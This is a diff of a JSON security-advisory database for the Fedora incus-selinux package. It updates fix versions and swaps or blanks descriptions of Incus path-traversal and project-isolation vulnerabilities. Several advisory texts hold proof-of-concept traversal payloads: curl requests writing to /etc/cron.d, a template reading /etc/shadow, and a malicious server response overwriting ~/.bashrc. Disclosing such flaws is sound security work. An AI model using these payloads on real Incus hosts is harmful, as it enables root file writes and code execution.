@@ -1,7 +1,7 @@
 {
     "package_name": "incus-selinux",
     "advisory": {
-        "8": {
+        "10": {
             "CVE-2025-58183": {
                 "cve_id": "CVE-2025-58183",
                 "title": "tar.Reader does not set a maximum size on the number of sparse re ...",
@@ -11,7 +11,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -69,7 +69,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -88,7 +88,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -107,7 +107,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -126,7 +126,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -145,7 +145,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -164,7 +164,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -183,7 +183,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -202,7 +202,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     }
                 ]
@@ -618,8 +618,8 @@
             },
             "CVE-2026-81495": {
                 "cve_id": "CVE-2026-81495",
-                "title": "Arbitrary file write on host via path traversal in custom volume import",
-                "description": "## Summary `POST /1.0/storage-pools/<pool>/volumes` with an `application/octet-stream` body (custom-volume ISO or backup import) uses an attacker-controlled name as an on-disk path segment without validation. A project user with the `can_create_storage_volumes` entitlement can supply `X-Incus-name: ../../../../<target>` (ISO) or an `index.yaml name: ../../../../<target>` (backup), causing the root Incus daemon to create directories, remove directory trees (`os.RemoveAll`), and (backup vector) unpack attacker content outside the storage pool. The `validate.IsAPIName` guard exists only on the JSON create branch and is never reached on the import branches. ## Root Cause In `storagePoolVolumesPost` (`cmd/incusd/storage_volumes.go:828-833`), octet-stream requests dispatch to `createStoragePoolVolumeFromISO(..., r.Header.Get('X-Incus-name'))` (`:830`) or `createStoragePoolVolumeFromBackup(...)` (`:833`) BEFORE the `validate.IsAPIName(req.Name)` at `:845` (which is only on the JSON branch). `createStoragePoolVolumeFromISO` (`:2697`) checks only `volName == ''` (`:2701`). The name flows to `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` -> `project.StorageVolume(projectName, volName)` -> `GetVolume(...).MountPath()` -> `dir.CreateVolume` `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`. `VolumeDBCreate`/`validateVolume` validate config keys only, not the name (verified - no `ValidName`/`IsAPIName`/`filepath` check in either). ## Impact Root-owned arbitrary directory creation and directory-tree removal (`os.RemoveAll`) at an attacker-chosen path (integrity/DoS). The backup import vector additionally unpacks tarball rootfs bytes, giving arbitrary-content file write as root -> host RCE. ## Proof of Concept ISO: `curl -X POST --data-binary @x.iso -H 'Content-Type: application/octet-stream' -H 'X-Incus-type: iso' -H 'X-Incus-name: ../../../../etc/cron.d/pwn' https://incus/1.0/storage-pools/default/volumes` (as a user with `can_create_storage_volumes`). ## Attack Chain 1. Entry: `POST /1.0/storage-pools/<pool>/volumes`, `Content-Type: application/octet-stream`, `X-Incus-type: iso`, `X-Incus-name: ../../../../etc/cron.d/x` -> `createStoragePoolVolumeFromISO` (`storage_volumes.go:830`). Guard: `allowPermission(project, can_create_storage_volumes)`. 2. Check: `if volName == ''` (`:2701`) - rejects only empty. `validate.IsAPIName(req.Name)` (`:845`) is on the JSON branch, not reached. Bypass proof: `volName` passes with any value including the traversal string. 3. Sink: `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` (`backend.go`) -> `project.StorageVolume(proj, volName)` -> `GetVolume(...).MountPath()` -> `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`, as root. `VolumeDBCreate`->`validateVolume` validates config keys only (verified). 4. Impact: root arbitrary dir create + directory-tree removal at attacker path; backup vector adds arbitrary-content write (RCE). ## Bypass Evidence `validate.IsAPIName` present but on the wrong branch (`:845`, JSON only); import branches (`:830`/`:833`) bypass it; downstream validation is config-only. `filepath.Join` collapse verified (same as the instance backup-import path). Forced `.iso` suffix constrains the final filename but still permits arbitrary-directory creation/removal via `..`. ## Affected Versions `<= 7.2.0` (vulnerable code verified present on latest release tag v7.2.0 and on HEAD 60d85b3e; no fix commit on `cmd/incusd/storage_volumes.go` between v7.2.0 and HEAD). ## Suggested Fix Apply `validate.IsAPIName(volName, false)` to the `X-Incus-name` header and to `bInfo.Name`/each volume-snapshot name at handler entry, before any storage I/O. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -631,8 +631,8 @@
             },
             "CVE-2026-81496": {
                 "cve_id": "CVE-2026-81496",
-                "title": "Arbitrary file write on host via path traversal in instance backup import",
-                "description": "## Summary `POST /1.0/instances` with an `application/octet-stream` body (instance backup import) reads the instance name from the tarball's `backup/index.yaml` verbatim and uses it as an on-disk path segment. A project user with the `can_create_instances` entitlement can set `name: ../../../../etc/cron.d/x`, causing the root Incus daemon to create a directory and unpack attacker-controlled tarball content outside the storage pool - before any name validation runs. This yields arbitrary directory creation and arbitrary-content file write as root, and thus host RCE. ## Root Cause In `createFromBackup` (`cmd/incusd/instances_post.go`), the tarball metadata is parsed by `backup.GetInfo` (`internal/server/backup/backup_info.go:64-160`), which loads `result.Name` straight from `index.yaml` via YAML unmarshal with NO validation - no `filepath.Clean`, no `IsAPIName`, no `/` or `..` rejection. The name then flows to `pool.CreateInstanceFromBackup` -> `project.Instance(srcBackup.Project, srcBackup.Name)` (`internal/server/storage/backend.go:744`) -> `vol.MountPath()` -> `GetVolumeMountPath` = `VarPath('storage-pools', pool, 'containers', <name>)` -> `EnsureMountPath` `os.Mkdir` + `CreateVolumeFromBackup` content unpack. `instance.ValidName` exists only at `instances_post.go:1452`, which is on the JSON-dispatch path and is never reached for the octet-stream branch (dispatch returns at `:1157`). ## Impact Root-owned arbitrary directory creation and arbitrary-content file write outside the storage pool (e.g. `/etc/cron.d/`), leading to host remote code execution. Snapshot names (`bInfo.Snapshots[]`) are a second identical vector. ## Proof of Concept 1. Build an instance backup tarball whose `backup/index.yaml` sets `name: ../../../../etc/cron.d/pwn` and whose `container/rootfs` contains a crafted cron file body. 2. `curl -X POST --data-binary @backup.tar -H 'Content-Type: application/octet-stream' https://incus/1.0/instances` (as a user with `can_create_instances`). 3. The daemon writes attacker content to `/etc/cron.d/pwn` as root. ## Attack Chain 1. Entry: `POST /1.0/instances`, `Content-Type: application/octet-stream`, no `X-Incus-name`. Guard: none for this branch -> `createFromBackup` (`instances_post.go:1157`). 2. Parse: `bInfo, _ := backup.GetInfo(backupFile, ...)` (`instances_post.go:851`) reads `Name` from `index.yaml`. Guard: `GetInfo` (`backup_info.go:64-160`) - none. Bypass proof: field returned untouched from YAML unmarshal; no `Clean`/`IsAPIName`/`..` check in the function (verified at HEAD). 3. Restriction check: `AllowInstanceCreation` (`instances_post.go:871`) validates project restrictions only, not name syntax. Passes. 4. Sink: `pool.CreateInstanceFromBackup(*bInfo, ...)` (`instances_post.go:992`) -> `project.Instance(proj, bInfo.Name)` (`backend.go:744`) -> `vol.MountPath()` -> `EnsureMountPath` `os.Mkdir` (`internal/server/storage/drivers/volume.go`) + content unpack, as root, BEFORE `internalImportFromBackup` and BEFORE the unreachable `ValidName` at `:1452`. 5. Impact: root arbitrary dir create + attacker-content file write -> host RCE. ## Bypass Evidence No guard exists between the tarball name and the disk write. Go's `filepath.Join` collapses `..`: `filepath.Join('/var/lib/incus/storage-pools/p/containers','../../../../etc/cron.d/x')` = `/var/lib/etc/cron.d/x` (verified by running it; deeper `..` reaches `/etc/cron.d/x`). Same class as CVE-2026-48753 but a distinct, unfixed entry point (record name used as path segment, not a symlink inside the archive payload). ## Affected Versions `<= 7.2.0` (vulnerable code verified present on latest release tag v7.2.0 and on HEAD 60d85b3e; no fix commit on `cmd/incusd/instances_post.go` between v7.2.0 and HEAD). ## Suggested Fix Apply `instance.ValidName(bInfo.Name, false)` (and validate each snapshot name) immediately after `backup.GetInfo`, before any storage I/O. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -644,8 +644,8 @@
             },
             "CVE-2026-81497": {
                 "cve_id": "CVE-2026-81497",
-                "title": "security update",
-                "description": "security update",
+                "title": "Arbitrary host file read+write via VM template path traversal (incomplete fix of CVE-2026-48752)",
+                "description": "### Summary The fix for **CVE-2026-48752** (`GHSA-vxp5-584q-c479`, template-traversal to host read/write, addressed in **7.2.0**) was applied to the **LXC container driver only**. The sibling **QEMU/VM driver's** template path (`driver_qemu.go` \u2192 `templateApplyNow`) never received the same guard, so its template read and write remain unbounded. An authenticated user who can **create/launch a VM from a custom image**, or **restore a VM backup**, controls the image/backup `metadata.yaml` (the `templates` map and each `tpl.Template` value) and can traverse out of the templates directory to: - **read arbitrary host files** as root, which are then disclosed into the guest, and - **create root-owned files anywhere on the host** (with a `.out` suffix). ### Details The **LXC driver** was hardened for CVE-2026-48752 (`internal/server/instance/drivers/driver_lxc.go`): ```go os.OpenRoot(d.RootfsPath()) // ~:7493 confines writes if filepath.Base(tpl.Template) != tpl.Template // ~:7515 rejects any '/', blocks all '../' os.Lstat(d.TemplatesPath()) ... ModeSymlink // ~:7519 / ~:7533 rejects symlinked dir/source ``` The **QEMU/VM driver received none of these**. `driver_qemu.go` \u2192 `templateApplyNow` (func @ `:3712`) has, before its file operations, only a `slices.Contains(tpl.When, trigger)` check. There is **no path validation**: ```go // READ ~:3779 -- raw tpl.Template, no containment tplString, err := os.ReadFile(filepath.Join(d.TemplatesPath(), tpl.Template)) // WRITE ~:3765 -- raw tpl.Template, path is host-side under incusd (root) w, err = os.Create(filepath.Join(path, fmt.Sprintf('%s.out', tpl.Template))) ``` - **READ vector:** `tpl.Template = '../../../../etc/shadow'` reads an arbitrary host file, which is rendered into the VM config drive (`config/files/*.out`, exported to the guest over 9p/virtiofs) \u2192 **host-file disclosure to the attacker's guest**. Cleanest, exact-path vector. - **WRITE vector:** `tpl.Template = '../../../../etc/cron.d/x'` creates `/etc/cron.d/x.out`, a **root-owned file anywhere on the host** with pongo2-rendered content. A grep for `os.OpenRoot` / `OpenTemplates` over the templates directory in the incus QEMU path returns **zero hits**. Reachability: `templateApplyNow` is invoked from `generateConfigShare` on **VM start**, so the static call path is strong. **Reference remediation.** Apply incus's own LXC-driver guards (the `filepath.Base` reject + `os.OpenRoot` confinement) to `driver_qemu.go` \u2192 `templateApplyNow`, covering both the read and the write. For the **read** specifically, upstream **LXD** is a second reference (it confines the QEMU read via `d.OpenTemplates()`, an `os.Root`). Note that **LXD does *not* confine the QEMU write either**, so the write reference is incus's own LXC guard, not LXD. **Scope / honesty.** Source-confirmed via a white-box review of the public repo at fresh HEAD (`ccdf811`) plus an LXD cross-reference; the guard absence was grep-verified. A live-VM end-to-end PoC is the documented next step. The read is a clean arbitrary host-file disclosure. The write is a genuine root-owned arbitrary-file-create primitive, but the created path is **forced to carry a `.out` suffix**, which constrains a direct write-to-RCE, so this is framed as **High**, not a 9.9 Critical, and no RCE is claimed without a `.out`-compatible execution path. ### PoC On a self-hosted **incus 7.2.0 or later**, craft a VM image whose `metadata.yaml` contains: ```yaml templates: '/x': template: '../../../../../../tmp/incus-poc' when: - start ``` Launch the VM, then confirm on the host: ```bash ls -l /tmp/incus-poc.out # created by incusd (root) = out-of-templates write ``` Separately, a `tpl.Template` of `../../etc/hostname` is read and disclosed into the guest config drive (`config/files/*.out`). ### Impact **Path traversal (CWE-22) + link following (CWE-59)** in the VM/QEMU template path. An authenticated user able to create/launch a VM from a custom image, or restore a VM backup, can: 1. **read arbitrary host files as root**, disclosed into their guest (e.g. `/etc/shadow`), and 2. **create root-owned files** with attacker-controlled content anywhere on the host (`.out`-suffixed). **Undisclosed.** The authoritative public dissection ([Snyk Labs: *Newlines, Symlinks, and Arbitrary Writes: Dissecting High-Severity Vulnerabilities in Incus*](https://labs.snyk.io/resources/incus-vulnerabilities-newline-symlink-arbitrary-writes/)) covers **only** `driver_lxc.go` and explicitly notes the VM drivers were not separately audited; no incus issue, PR, or CVE names `driver_qemu.go` \u2192 `templateApplyNow`. --- **Reporter:** Kingsley Olukanni (GitHub: **babakizo420**).",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -670,8 +670,8 @@
             },
             "CVE-2026-81499": {
                 "cve_id": "CVE-2026-81499",
-                "title": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network addre",
-                "description": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network address sets]",
+                "title": "Project restriction bypass on network address sets",
+                "description": "### Summary The network address set API is missing from the auth object project-expansion switch, so a project-restricted client can read and rewrite the default project's address sets. ### Details **Project confinement bypass on the network address set API** All six handlers in cmd/incusd/network_address_sets.go resolve the effective project via project.NetworkProject(), which returns 'default' when the project does not have features.networks set. But expandProject in cmd/incusd/daemon.go (lines 326-372) has no branch for auth.ObjectTypeNetworkAddressSet, so the authorization object is constructed with the requested project instead of the effective one. Verified against the switch at HEAD c0ca96d, which handles Profile (352), StorageBucket (354), StorageVolume (356), NetworkZone (363), Image/ImageAlias (365) and Network/NetworkACL (367) \u2014 NetworkAddressSet appears nowhere. Consequence: a certificate restricted to project P can read, rewrite, rename and delete the default project's address sets, which feed network ACL rules for every other tenant. features.networks defaults to false at project creation, so this is the default state of every project, not an unusual configuration. Supporting evidence: the sibling auth.ObjectTypeNetworkACL is expanded on the same line, and the address-set LIST endpoint filters on the real project and correctly returns nothing \u2014 this is the only mismatch found when diffing every cmd/incusd caller of an effective-project resolver against the object types passed to allowPermission. ### Suggested fixes Add auth.ObjectTypeNetworkAddressSet to the expansion in expandProject alongside Network and NetworkACL. More durably, make expandProject fail closed on an unhandled object type rather than returning the requested project, so a future new API cannot repeat this. ### Tooling and credit AI assistance was used during investigation; the reporter read the full expandProject switch and confirmed the missing object type against its expanded siblings at HEAD, and independently confirmed the os.WriteFile call in instance_metadata.go.",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -683,8 +683,8 @@
             },
             "CVE-2026-81500": {
                 "cve_id": "CVE-2026-81500",
-                "title": "Incus CLI path traversal when exporting an image from a malicious server",
-                "description": "## Summary The `incus` CLI, when exporting or copying an image from a remote server into a directory target, takes the local filename verbatim from the server-controlled `Content-Disposition: filename=` for UNIFIED images and passes it into `os.Rename(tmp, filepath.Join(target, resp.MetaName))` with no `filepath.Base` / traversal check. A malicious or MITM'd image server that the user points the CLI at can therefore write the downloaded (attacker-controlled) image bytes to an arbitrary path on the client, escaping the export directory \u2014 e.g. overwrite `~/.bashrc` \u2192 code execution on the client's next shell. ## Root Cause On the unified-image branch (`client/incus_images.go:339`, forced by the server not sending a `multipart/form-data` Content-Type), `mime.ParseMediaType(Content-Disposition)` yields `filename = cdParams['filename']` and `resp.MetaName = filename` is stored verbatim at `client/incus_images.go:356` with NO `filepath.Base`. It then reaches `os.Rename(targetMeta, filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. The multipart/split branch is SAFE because it uses `multipart.Part.FileName()`, which basenames the value. The hash guard `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)` at `client/incus_images.go:360` is bypassable: (a) the server sets response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped entirely; or (b) when the user passes an alias, `fingerprint` is itself server-controlled via `dereferenceAlias`\u2192`GetImageAliasType().Target` (`image.go:133-142`), so the attacker sets it to `sha256(malicious_bytes)` and `HasPrefix` passes. ## Impact Arbitrary file overwrite on the client as the invoking user \u2192 code execution (shell rc, cron, SSH config). The attacker is a remote/MITM'd image server; the victim must run `incus image export`/`copy` into a directory target from that remote. Pointing the CLI at public/untrusted image servers is a normal Incus workflow. ## Proof of Concept ``` # Malicious image server. Victim runs: incus image export evil:someimg ~/Downloads/ # Server responds to the /export request with: # HTTP/1.1 200 OK # X-Incus-Type: oci # bypass (a): skips hash check # Content-Type: application/octet-stream # forces unified branch (not multipart) # Content-Disposition: attachment; filename='../../../../home/victim/.bashrc' # <attacker payload bytes> # Client: resp.MetaName = '../../../../home/victim/.bashrc' (no filepath.Base) # os.Rename(tmp, filepath.Join('~/Downloads', resp.MetaName)) -> overwrites ~/.bashrc # -> code execution as victim on next interactive shell. ``` ## Attack Chain 1. **Entry:** victim runs `incus image export evil:x ~/Downloads/` (directory target). `IsDir(target)` true \u2192 `cmd/incus/image.go:569-575`, `606` `GetImageFile`, `639-641` rename branch. - **Guard:** none on the server-provided name. 2. **Branch force:** attacker server responds with a non-`multipart/form-data` Content-Type \u2192 unified branch `client/incus_images.go:339` (multipart branch `:286` skipped). - **Guard:** branch selection. **Bypass proof:** attacker controls Content-Type. 3. **Tainted name:** `mime.ParseMediaType(Content-Disposition)` \u2192 `resp.MetaName = filename` at `client/incus_images.go:356`, NO `filepath.Base`. - **Guard:** `mime.ParseMediaType` filename param. **Bypass proof:** `go run` confirmed it returns `../../../../home/victim/.bashrc` verbatim, unlike `part.FileName()` (basenames to `evil`) in the multipart branch (`:310`). 4. **Hash guard:** `client/incus_images.go:360` `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)`. - **Bypass proof (a):** response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped (source-verified). **(b):** alias-derived `fingerprint` = `GetImageAliasType().Target` is server-controlled (`image.go:133-142`) \u2192 attacker sets `sha256(malicious)`; `HasPrefix` passes (source-verified). 5. **Sink:** `os.Rename(targetMeta, filepath.Join('~/Downloads', '../../../../home/victim/.bashrc'))` at `cmd/incus/image.go:641` \u2192 writes attacker bytes to `~/.bashrc`. - **Bypass proof:** `go run` confirmed `os.Rename` across the collapsed `../` escaped the dir and overwrote the target. 6. **Impact:** arbitrary file overwrite on the client as the invoking user \u2192 RCE. ## Bypass Evidence - `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization; `os.Rename(...filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. `grep filepath.Base` \u2192 only in the upload/import path (`image.go:834/836`), never between `:356` and `:641`. - `go run` proofs: `mime.ParseMediaType` returns `../` verbatim; `part.FileName()` basenames (safe branch asymmetry); `os.Rename` across `../` overwrites the escaped target. - DISTINCT from GHSA-f6m5-xw2g-xc4x / CVE-2026-48769: that advisory's DETAILS are the DAEMON (`cmd/incusd/daemon_images.go`, `os.Create`, trusting `Incus-Image-Hash` for `source.type=url`, writing under `/var/lib/incus/images/`). This report covers the CLI CLIENT (`client/incus_images.go` + `cmd/incus/image.go`, `os.Rename`, trusting `Content-Disposition`, writing on the user's local filesystem). Different component, tainted header, sink, and fix. ## Affected Versions `<= 7.3.0` (Go module `github.com/lxc/incus/v7`). Sinks verified present on the v7.3.0 release tag (`90429bf`): `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization, the hash gate still keyed on the server-supplied `X-Incus-Type` header at `:254`/`:360`, and the `os.Rename` sink at `cmd/incus/image.go:641`. Confirmed still present on `main`. ## Suggested Fix Apply `filepath.Base` to `resp.MetaName` (and `resp.RootfsName`) on the unified-image branch before `os.Rename`, mirroring the multipart branch's use of `part.FileName()`; reject any name containing path separators or `..`. --- Reported by zx (Jace) \u2014 GitHub: @manus-use",
+                "title": "[Unknown description]",
+                "description": "[Unknown description]",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -748,8 +748,8 @@
             },
             "GHSA-jh4v-j34r-2mgh": {
                 "cve_id": "GHSA-jh4v-j34r-2mgh",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Project restriction bypass for custom volume copy with omitted source type",
+                "description": "### Summary Creating a custom storage volume with a `source` volume but no `source.type` is handled as a copy, but the source volume access check only applies when `source.type` is explicitly set to `copy`. A request that omits the type goes straight to the copy code path with a caller-controlled `source.project`. ### Impact Any client allowed to create custom volumes in a project can copy any custom volume from any other project on the server, including its snapshots and configuration, and read its contents, defeating project isolation. ### Details The `POST /1.0/storage-pools/{pool}/volumes/custom` endpoint only checks `can_create_storage_volumes` on the target project. The `can_view` check on the source volume added for CVE-2026-55621 lives in the `copy` arm of the source type switch, while the empty type arm calls the same copy helper without it. The official client always sets `source.type` to `copy`, so the empty form is only reachable through a crafted request.",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -774,8 +774,8 @@
             },
             "GHSA-mmj7-8rgf-mx2h": {
                 "cve_id": "GHSA-mmj7-8rgf-mx2h",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Read of other bucket objects via unsigned header on presigned S3 upload URL",
+                "description": "### Summary The in-process S3 server used for storage buckets on local storage pools verifies SigV4 signatures over the headers listed by the client in `X-Amz-SignedHeaders`, but never checks that every `x-amz-*` header present on the request is in that list. The SigV2 presigned path doesn't include those headers in the string to sign at all. A request can therefore carry unsigned `x-amz-*` headers that change how it is handled, which AWS S3 refuses. ### Impact Anyone holding a presigned upload URL for a single object, without any bucket credentials, can add an unsigned `X-Amz-Copy-Source` header and have the server copy any other object in the same bucket onto the granted key, with the copy performed under the signer's credentials. If the holder can also read the target key, for instance through a matching presigned download URL, this discloses the contents of arbitrary objects in the bucket. The response also leaks the ETag of the source object. All storage pool drivers using the built-in S3 server are affected. Ceph radosgw buckets are not, and the bucket listener (`core.storage_buckets_address`) is disabled by default. ### Details The canonical request only iterates over the client-supplied signed header list, so headers outside that list are never seen by the signature check. The object handler routes any PUT carrying `X-Amz-Copy-Source` to the copy path based on the header alone, so a write grant becomes a read within the bucket. The same gap exists on the `Authorization` header path, and the SigV2 presigned path omits the `CanonicalizedAmzHeaders` section entirely. ### Workarounds Don't hand out presigned URLs for buckets that also hold sensitive objects, or keep the bucket listener disabled.",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -800,8 +800,8 @@
             },
             "GHSA-x8gj-2q73-qr6j": {
                 "cve_id": "GHSA-x8gj-2q73-qr6j",
-                "title": "Restricted client can read storage bucket keys in the default project",
-                "description": "### Summary The storage bucket key endpoints, `GET /1.0/storage-pools/{pool}/buckets/{bucket}/keys` and `GET .../keys/{key}`, only require `can_view` on the bucket and return the S3 access key and secret key. When using the TLS authorizer, a restricted client certificate is granted read-only access to buckets in the `default` project, so that projects without `features.storage.buckets` can use them. That read-only exception therefore also hands out the bucket credentials. ### Impact A client with a restricted TLS certificate scoped to any project can read the access key and secret key of every bucket in the `default` project, then use them directly against the S3 endpoint to read, modify or delete the objects in those buckets. Only the TLS authorizer is affected. OpenFGA deployments are not. ### Details Bucket keys are credentials rather than metadata, so both key retrieval endpoints now require `can_edit` on the bucket. Listing buckets and reading bucket details remain available under `can_view`. ### Workarounds Don't keep buckets in the `default` project on servers that issue restricted client certificates, or rotate the keys of any bucket a restricted client may have read.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -822,7 +822,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -880,7 +880,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -899,7 +899,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -918,7 +918,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -937,7 +937,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -956,7 +956,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -975,7 +975,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -994,7 +994,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     },
                     {
@@ -1013,7 +1013,7 @@
                 "events": [
                     {
                         "introduced": "6.15-2.fc43",
-                        "fixed": "6.23-3.fc43",
+                        "fixed": "6.23-2.fc43",
                         "identifier": "fc43"
                     }
                 ]
@@ -1429,8 +1429,8 @@
             },
             "CVE-2026-81495": {
                 "cve_id": "CVE-2026-81495",
-                "title": "Arbitrary file write on host via path traversal in custom volume import",
-                "description": "## Summary `POST /1.0/storage-pools/<pool>/volumes` with an `application/octet-stream` body (custom-volume ISO or backup import) uses an attacker-controlled name as an on-disk path segment without validation. A project user with the `can_create_storage_volumes` entitlement can supply `X-Incus-name: ../../../../<target>` (ISO) or an `index.yaml name: ../../../../<target>` (backup), causing the root Incus daemon to create directories, remove directory trees (`os.RemoveAll`), and (backup vector) unpack attacker content outside the storage pool. The `validate.IsAPIName` guard exists only on the JSON create branch and is never reached on the import branches. ## Root Cause In `storagePoolVolumesPost` (`cmd/incusd/storage_volumes.go:828-833`), octet-stream requests dispatch to `createStoragePoolVolumeFromISO(..., r.Header.Get('X-Incus-name'))` (`:830`) or `createStoragePoolVolumeFromBackup(...)` (`:833`) BEFORE the `validate.IsAPIName(req.Name)` at `:845` (which is only on the JSON branch). `createStoragePoolVolumeFromISO` (`:2697`) checks only `volName == ''` (`:2701`). The name flows to `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` -> `project.StorageVolume(projectName, volName)` -> `GetVolume(...).MountPath()` -> `dir.CreateVolume` `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`. `VolumeDBCreate`/`validateVolume` validate config keys only, not the name (verified - no `ValidName`/`IsAPIName`/`filepath` check in either). ## Impact Root-owned arbitrary directory creation and directory-tree removal (`os.RemoveAll`) at an attacker-chosen path (integrity/DoS). The backup import vector additionally unpacks tarball rootfs bytes, giving arbitrary-content file write as root -> host RCE. ## Proof of Concept ISO: `curl -X POST --data-binary @x.iso -H 'Content-Type: application/octet-stream' -H 'X-Incus-type: iso' -H 'X-Incus-name: ../../../../etc/cron.d/pwn' https://incus/1.0/storage-pools/default/volumes` (as a user with `can_create_storage_volumes`). ## Attack Chain 1. Entry: `POST /1.0/storage-pools/<pool>/volumes`, `Content-Type: application/octet-stream`, `X-Incus-type: iso`, `X-Incus-name: ../../../../etc/cron.d/x` -> `createStoragePoolVolumeFromISO` (`storage_volumes.go:830`). Guard: `allowPermission(project, can_create_storage_volumes)`. 2. Check: `if volName == ''` (`:2701`) - rejects only empty. `validate.IsAPIName(req.Name)` (`:845`) is on the JSON branch, not reached. Bypass proof: `volName` passes with any value including the traversal string. 3. Sink: `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` (`backend.go`) -> `project.StorageVolume(proj, volName)` -> `GetVolume(...).MountPath()` -> `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`, as root. `VolumeDBCreate`->`validateVolume` validates config keys only (verified). 4. Impact: root arbitrary dir create + directory-tree removal at attacker path; backup vector adds arbitrary-content write (RCE). ## Bypass Evidence `validate.IsAPIName` present but on the wrong branch (`:845`, JSON only); import branches (`:830`/`:833`) bypass it; downstream validation is config-only. `filepath.Join` collapse verified (same as the instance backup-import path). Forced `.iso` suffix constrains the final filename but still permits arbitrary-directory creation/removal via `..`. ## Affected Versions `<= 7.2.0` (vulnerable code verified present on latest release tag v7.2.0 and on HEAD 60d85b3e; no fix commit on `cmd/incusd/storage_volumes.go` between v7.2.0 and HEAD). ## Suggested Fix Apply `validate.IsAPIName(volName, false)` to the `X-Incus-name` header and to `bInfo.Name`/each volume-snapshot name at handler entry, before any storage I/O. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -1442,8 +1442,8 @@
             },
             "CVE-2026-81496": {
                 "cve_id": "CVE-2026-81496",
-                "title": "Arbitrary file write on host via path traversal in instance backup import",
